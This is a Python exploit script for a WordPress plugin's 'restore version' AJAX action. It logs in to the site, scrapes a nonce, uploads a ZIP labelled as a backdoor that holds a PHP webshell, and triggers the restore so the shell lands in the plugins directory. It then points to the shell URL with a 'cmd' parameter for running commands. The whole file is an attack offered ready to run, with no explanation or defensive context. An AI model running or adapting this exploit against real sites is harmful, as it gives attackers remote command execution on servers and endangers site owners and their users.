import requests
from bs4 import BeautifulSoup
import sys
import os
import re

# === CONFIG ===
shell_zip = 'backdoor.zip'  # ZIP containing plugin files with webshell
shell_filename = 'shell.php'  # name of your webshell inside plugin folder
target_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost/wordpress/'
username = 'mrj'
password = 'mrj'

session = requests.Session()

def login():
    print('[*] Logging in...')
    login_page = session.get(target_url + 'wp-login.php')
    soup = BeautifulSoup(login_page.text, 'html.parser')
    nonce = soup.find('input', {'name': 'log'})  # just a check

    res = session.post(target_url + 'wp-login.php', data={
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': target_url + 'wp-admin/',
        'testcookie': 1
    }, allow_redirects=False)

    if 'wordpress_logged_in' in session.cookies.get_dict():
        print('[+] Logged in successfully.')
        return True
    print('[-] Login failed.')
    return False

def get_nonce():
    print('[*] Extracting nonce...')
    plugins_page = session.get(target_url + 'wp-admin/plugins.php')
    match = re.search(r'name="plugin_reviews_restore_version"\s+value="([a-f0-9]+)"', plugins_page.text)
    if match:
        nonce = match.group(1)
        print(f'[+] Nonce: {nonce}')
        return nonce
    print('[-] Failed to extract nonce.')
    return None

def upload_shell():
    print('[*] Uploading shell ZIP...')
    media_upload = target_url + 'wp-admin/media-new.php'
    upload = session.post(media_upload, files={
        'async-upload': (os.path.basename(shell_zip), open(shell_zip, 'rb')),
        'html-upload': (None, 'Upload')
    }, data={'post_id': 0})
    if upload.status_code == 200 and 'error' not in upload.text.lower():
        print('[+] Shell ZIP uploaded. Check manually in /wp-content/uploads/')
    else:
        print('[-] Upload may have failed.')

def trigger_restore(nonce, zip_rel_path, parent_plugin_path):
    print('[*] Sending restore request...')
    ajax_url = target_url + 'wp-admin/admin-ajax.php?action=eos_plugin_reviews_restore_version'
    data = {
        'nonce': nonce,
        'dir': zip_rel_path,
        'parent_plugin': parent_plugin_path
    }
    res = session.post(ajax_url, data=data)
    if res.text.strip() == '1':
        print('[+] Exploit triggered successfully.')
    else:
        print(f'[-] Failed: {res.text.strip()}')

def main():
    if not login():
        return

    nonce = get_nonce()
    if not nonce:
        return

    upload_shell()

    # Adjust these based on your ZIP location and parent plugin path
    zip_rel_path = f'wp-content/uploads/{shell_zip}'
    parent_plugin_path = 'plugversions/plugversions.php'

    trigger_restore(nonce, zip_rel_path, parent_plugin_path)

    print('[*] If shell is inside plugin folder, check:')
    print(f'    {target_url}wp-content/plugins/plugversions/{shell_filename}?cmd=id')

if __name__ == '__main__':
    main()
